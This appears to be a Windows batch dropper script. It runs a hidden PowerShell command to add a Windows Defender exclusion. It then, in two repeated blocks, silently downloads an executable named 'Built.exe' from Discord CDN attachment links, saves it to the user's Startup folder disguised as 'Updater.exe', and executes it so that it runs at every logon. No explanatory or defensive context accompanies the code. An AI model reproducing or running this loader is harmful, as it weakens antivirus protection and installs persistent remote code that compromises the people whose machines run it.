powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/973337617057869825/1176190901970796564/Built.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/973337617057869825/1176181839065526402/Built.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
cd /d %~dp0
